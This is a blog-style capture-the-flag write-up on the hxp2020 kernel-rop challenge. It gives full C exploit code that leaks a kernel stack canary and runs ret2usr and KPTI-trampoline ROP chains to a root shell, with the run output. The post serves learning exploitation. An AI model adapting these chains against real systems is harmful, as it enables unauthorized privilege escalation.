# Learning ret2usr

### Prologue

I am currently in winter break and extremely bored so I decided to start this kind of blog-like thing while I learn kernel stuff because this will keep me accountable and I will really have to understand the topic to be able to write about it. Also I am doing some hardware hacking stuff as well so I might start one for that too. I will keep all references where I learned from down at the bottom. 

To be honest kernel exploitation always seemed so daunting and scary because of so many things, but one I had to learn how a kernel works to an extent hahahaha. I did watch a few videos and learned a bit on the ways that a kernel works, also from watching in depth videos on meltdown helped, so I kind of have enough of an understanding to begin learning kernel exploitation and just learn about operating systems along the way. So I hope you enjoy. 

### The Beginning

So to start this, like almost everyone that wanted to learn kernel exploitation, I started with the kernel-rop challenge from hxp2020 CTF. I will start by disabling all kernel mitigations and then slowly adding them on one-by-one. 

So when I got the challenge I had a compressed file system under the name of `initramfs.cpio.gz` and after decompressing it, I got the file system. Now when I want to add something all I have to do is decompress it, add whatever file I want to be in there, compress it, and then run the `run.sh` file to start the VM instance; and that is how I would add my exploits.

Not just that, but I also got a kernel image under the name of `vmlinuz`, so all I did was extract the image and I would be able to run ROPgadget or ropper to get gadgets or whatnot and then sent them to a .txt file because it takes a while to search for gadgets. Also all of these scripts come from [my friend Alex's stuff repo](https://github.com/SolarDebris/stuff).

With this in mind I could finally get started.


### Mitigations

There are a few kernel exploit mitigations, and to be honest, they are very similar to their userland equivalents.
 - KASLR: Basically the same as the userland equivalent, ASLR.
 - FG-KASLR: It randomizes kernel space addresses every time on boot. There are some exceptions though (will go into it later on).
 - SMEP/SMAP: Together they mark all userland pages as non RWX. 
 - KPTI: Separates userland and kernel page tables. Also minimizes the kernel page table that can be viewed when in user mode (I am oversimplifying it for my current understanding, usually I pick things up as I go instead of fully understanding everything before starting something).

### The Goal

The goal for kernel exploitation as a whole is not to get shell like in userland exploits, but instead your goal is to go from user privilages to root privilages---legit just turning one number into a 0. I don't know much about other exploit techniques so far but I can say that for ret2usr these will be our goals:
 - First we must save the program state.
 - Leak kernel stack cookie.
 - Call `prepare_kernel_cred(0)` since this will get us ready to get root, it will return a value that will be sent into another function later.
 - Call `commit_creds(param)` with the parameter returned by the `prepare_kernel_cred()` function.
 - After this we must switch back into user mode. To do so we first have to call `swapgs` which will swap the value of the `gs` register to a memory location in user space.
 - Then call either `iretq` or `sysretq` to actually make the switch between kernel and user. `iretq` is the simpler of the two, all it will do is populate `rip`, `cs`, `rflags`, `rsp`, and `ss` in that order, so you must put those values on the stack in reverse order. `sysretq` needs less registers but has stricter rules, it will move the value in `rcx` to `rip`, `rflags` to `r11`, and it requires bits 48-63 to be identical to bit 47 for `rip`.
 - Once you are finally in userland, all you have to do is call `system("/bin/sh")` and BAM, you got root.

### Starting The Exploit

#### Getting the stack cookie

So when I first started, I only had SMEP and SMAP on because in reality it is the same as without but the only difference is that instead of writing assembly you just have to write that inside a ROP chain. First let's look at the vulnerable module though.

The vulnerable module named `hackme.ko` has 6 functions: `hackme_open`, `hackme_init`, `hackme_exit`, and `hackme_release` are just here to initialize the module so that leaves `hackme_read` and `hackme_write` to be our vulnerable functions. Here is the Ghidra decompilation for both:

```c
ssize_t hackme_read(file *f,char *data,size_t size,loff_t *off)

{
  long lVar1;
  size_t sVar2;
  long in_GS_OFFSET;
  undefined local_a8 [8];
  int tmp [32];
  
  tmp._120_8_ = *(undefined8 *)(in_GS_OFFSET + 0x28);
  __memcpy(hackme_buf,local_a8);
  if (0x1000 < size) {
    __warn_printk("Buffer overflow detected (%d < %lu)!\n",0x1000,size);
    do {
      invalidInstructionException();
    } while( true );
  }
  __check_object_size(hackme_buf,size,1);
  lVar1 = _copy_to_user(data,hackme_buf,size);
  sVar2 = 0xfffffffffffffff2;
  if (lVar1 == 0) {
    sVar2 = size;
  }
  if (tmp._120_8_ == *(long *)(in_GS_OFFSET + 0x28)) {
    return sVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

ssize_t hackme_write(file *f,char *data,size_t size,loff_t *off)

{
  long lVar1;
  long in_GS_OFFSET;
  undefined local_a8 [8];
  int tmp [32];
  
  tmp._120_8_ = *(undefined8 *)(in_GS_OFFSET + 0x28);
  if (0x1000 < size) {
    __warn_printk("Buffer overflow detected (%d < %lu)!\n",0x1000);
    do {
      invalidInstructionException();
    } while( true );
  }
  __check_object_size(hackme_buf,size,0);
  lVar1 = _copy_from_user(hackme_buf,data,size);
  if (lVar1 == 0) {
    __memcpy(local_a8,hackme_buf,size);
  }
  else {
    size = 0xfffffffffffffff2;
  }
  if (tmp._120_8_ == *(long *)(in_GS_OFFSET + 0x28)) {
    return size;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

You can find the bug for yourself, it is kind of obvious. Just know that the `hackme_buf` is the actual buffer you use in userland when you call the `read` or `write` functions. 

So to get started we must first get a kernel cookie leak and to do so we will take advantage of the `hackme_read` function. All it is doing is reading too much data from the kernel space's `tmp` buffer to the point where there is a leak, and after looking through and running the program you can tell that the stack cookie is on index 16:

```
[+] Saved state
[*] Opened module
[*] Leak at index 0: 0xffffffff81a29330
[*] Leak at index 1: 0x12
[*] Leak at index 2: 0xb998bada295df400
[*] Leak at index 3: 0xffff888006890310
[*] Leak at index 4: 0xffffc900001bfe68
[*] Leak at index 5: 0x4
[*] Leak at index 6: 0xffff888006890300
[*] Leak at index 7: 0xffffc900001bfef0
[*] Leak at index 8: 0xffff888006890300
[*] Leak at index 9: 0xffffc900001bfe80
[*] Leak at index 10: 0xffffffff8184e047
[*] Leak at index 11: 0xffffffff8184e047
[*] Leak at index 12: 0xffff888006890300
[*] Leak at index 13: 0x0
[*] Leak at index 14: 0x7fff4045dd50
[*] Leak at index 15: 0xffffc900001bfea0
[*] Leak at index 16: 0xb998bada295df400 <=====
[*] Leak at index 17: 0xa0
[*] Leak at index 18: 0x0
[*] Leak at index 19: 0xffffc900001bfed8
[*] Canary value: 0xb998bada295df400
```

Also here is the code that made that:

```c
unsigned long leak_canary () {
	// unsigned longs are 8 bytes each, buf is 0x80 bytes large
	// so canary will be at index 16
	unsigned long leak[20];

	int sz = read(kernel_fd, leak, sizeof(leak));

	for (int i = 0; i < 20; i++) {
		printf("[*] Leak at index %d: 0x%lx\n", i, leak[i]);	
	}

	printf("[*] Canary value: 0x%lx\n", leak[16]);

	return leak[16];
}
```

#### Exploit one

Now that there is a canary leak, now we can get started with the actual exploit. First I will need to get the gadgets and addresses that I will use for this exploit. To get the addresses you will need to first go in `/etc/init.d/rcS` and write `setuidgid 0 /bin/sh` at the bottom so when you spawn into the instance you already have root. Next start the instance and cat out the file at `/proc/kallsyms` while grepping for whatever kernel function you need. Once you do that, just remove the line you wrote in `/etc/init.d/rcS` so you are not automatically spawned as root and you can see if your exploit works. Here are the addresses I used:

```c
unsigned long pop_rdi = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop_rbp = 0xffffffff816bf203;

unsigned long swapgs_pop_rbp = 0xffffffff8100a55f;
unsigned long iretq_pop_rbp = 0xffffffff814381cb;

unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
```

Next all I needed to do is save the current state and then create a ROP chain doing what I said to do inside the Goal section.

```c
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long user_rip = (unsigned long) shell;

void shell() {
	int uid = getuid();
	printf("[*] uid: %d\n", uid);
	puts("[*] Spawning shell.");
	system("/bin/sh");
}

// open the vulnerable kernel module
void open_ko_file() {
	kernel_fd = open("/dev/hackme", O_RDWR);

	if (kernel_fd < 0) {
		printf("[!] Error opening kernel module\n");
		exit(-1);
	}

	printf("[*] Opened module\n");
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}

void overflow () {
	unsigned long payload[50];
	int offset = 16;

	payload[offset++] = leak_canary();
	payload[offset++] = 0x0; // rbx
	payload[offset++] = 0x0; // r12
	payload[offset++] = 0x0; // rbp
	payload[offset++] = pop_rdi;
	payload[offset++] = 0x0;
	payload[offset++] = prepare_kernel_cred;
	payload[offset++] = mov_rdi_rax_pop_rbp;
	payload[offset++] = 0x0;
	payload[offset++] = commit_creds;
    payload[offset++] = swapgs_pop_rbp;
	payload[offset++] = 0x0;
	payload[offset++] = iretq_pop_rbp;
    payload[offset++] = user_rip + 1;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;

	puts("[*] Sending payload...");
	
	ssize_t w = write(kernel_fd, payload, sizeof(payload));

	puts("[!] This should never be reached");
}

int main() {
	save_state();
	open_ko_file();
	overflow();

	puts("[!] Something went wrong");
	return 0;
}

```

And just like that when you run it you get root!

```
/ $ ./exploit_one
[+] Saved state
[*] Opened module
[*] Leak at index 0: 0xffffffff81a29330
[*] Leak at index 1: 0x12
[*] Leak at index 2: 0x4470b02040fd00
[*] Leak at index 3: 0xffff88800689a410
[*] Leak at index 4: 0xffffc900001c7e68
[*] Leak at index 5: 0x4
[*] Leak at index 6: 0xffff88800689a400
[*] Leak at index 7: 0xffffc900001c7ef0
[*] Leak at index 8: 0xffff88800689a400
[*] Leak at index 9: 0xffffc900001c7e80
[*] Leak at index 10: 0xffffffff8184e047
[*] Leak at index 11: 0xffffffff8184e047
[*] Leak at index 12: 0xffff88800689a400
[*] Leak at index 13: 0x0
[*] Leak at index 14: 0x7ffc30eeb850
[*] Leak at index 15: 0xffffc900001c7ea0
[*] Leak at index 16: 0x4470b02040fd00
[*] Leak at index 17: 0xa0
[*] Leak at index 18: 0x0
[*] Leak at index 19: 0xffffc900001c7ed8
[*] Canary value: 0x4470b02040fd00
[*] Sending payload...
[*] uid: 0
[*] Spawning shell.
/ # id
uid=0 gid=0
/ # 
```

### Exploit Two

For this exploit, I have added KPTI protections. To be honest there is not that much of a difference for the technique that I used, KPTI trampoline. 

Literally all it is is that now we remove our swapgs and iretq gadgets into calling the nice and short named symbol, `swapgs_restore_regs_and_return_to_usermode`. This symbol has a bunch of `pop` instructions at first but then after 22 bytes the original symbol there is this:

```
	 * mov rdi, rsp
	 * mov rsp, gs
	 * push [rdi + 0x30]
	 * push [rdi + 0x28]
	 * push [rdi + 0x20]
	 * push [rdi + 0x18]
	 * push [rdi + 0x10]
	 * push [rdi]
	 * push rax
	 * jmp swapgs
```

And inside the swapgs address there will be this:

``` 
     * pop rax
	 * pop rdi
	 * call swapgs
	 * jmp iretq
```

Legit this makes it even easier compared to before. So now all you need to do is implement it into a ROP chain.

```c
void overflow () {
	unsigned long payload[50];
	int offset = 16;

	payload[offset++] = leak_canary();
	payload[offset++] = 0x0; // rbx
	payload[offset++] = 0x0; // r12
	payload[offset++] = 0x0; // rbp
	payload[offset++] = pop_rdi;
	payload[offset++] = 0x0;
	payload[offset++] = prepare_kernel_cred;
	payload[offset++] = mov_rdi_rax_pop_rbp;
	payload[offset++] = 0x0;
	payload[offset++] = commit_creds;
	payload[offset++] = swapgs_restore_regs_and_return_to_usermode + 22;
	payload[offset++] = 0x0; // pop rax
	payload[offset++] = 0x0; // pop rdi
	payload[offset++] = user_rip + 1;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;


	//payload[offset++] = (unsigned long) &escalate_privs; // ret
	puts("[*] Sending payload...");
	
	ssize_t w = write(kernel_fd, payload, sizeof(payload));

	puts("[!] This should never be reached");
}
```

Now when you recompress and run you should get root.

```
/ $ ./exploit_two
[+] Saved state
[*] Opened module
[*] Leak at index 0: 0xffffffff81a29330
[*] Leak at index 1: 0x12
[*] Leak at index 2: 0x63083951eb55a600
[*] Leak at index 3: 0xffff888006892210
[*] Leak at index 4: 0xffffc900001bfe68
[*] Leak at index 5: 0x4
[*] Leak at index 6: 0xffff888006892200
[*] Leak at index 7: 0xffffc900001bfef0
[*] Leak at index 8: 0xffff888006892200
[*] Leak at index 9: 0xffffc900001bfe80
[*] Leak at index 10: 0xffffffff8184e047
[*] Leak at index 11: 0xffffffff8184e047
[*] Leak at index 12: 0xffff888006892200
[*] Leak at index 13: 0x0
[*] Leak at index 14: 0x7ffcf2685e00
[*] Leak at index 15: 0xffffc900001bfea0
[*] Leak at index 16: 0x63083951eb55a600
[*] Leak at index 17: 0xa0
[*] Leak at index 18: 0x0
[*] Leak at index 19: 0xffffc900001bfed8
[*] Canary value: 0x63083951eb55a600
[*] Sending payload...
[*] uid: 0
[*] Spawning shell.
/ # id
uid=0 gid=0
/ # 
```

### Exploit Three

Now for the third and final exploit, I will turn on KASLR. I have not done this yet but I will push my progress so far just because fuck it. Will update if I remember to.

### References

[Low Level Adventures](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/)
